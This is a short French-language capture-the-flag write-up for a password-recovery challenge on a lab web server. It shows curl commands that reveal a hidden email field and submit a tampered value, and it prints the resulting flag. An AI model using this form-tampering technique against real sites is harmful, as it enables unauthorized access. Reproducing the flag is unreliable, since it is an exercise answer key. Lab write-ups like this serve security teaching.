Flag 6 - Recover Password

Quand on ouvre la page :
http://192.168.1.47/?page=recover

Aucun champ email n'est affiché dans le navigateur.

En récupérant le html avec curl :
curl -s "http://192.168.1.47/?page=recover"

On découvre un champ hidden avec un mail prédéfini :
<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">


La page impose une adresse mail sans que l'utilisateur ne puisse le voir.

On envoie une requête POST :
curl -s -X POST "http://192.168.1.47/index.php?page=recover" \
  -d "mail=test@test.com&Submit=Submit" | grep -i flag


<img width="1371" height="53" alt="image" src="https://github.com/user-attachments/assets/150ca8f4-c92f-4dbb-b5a7-5627ec86378b" />



La réponse nous envoie le flag:
The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
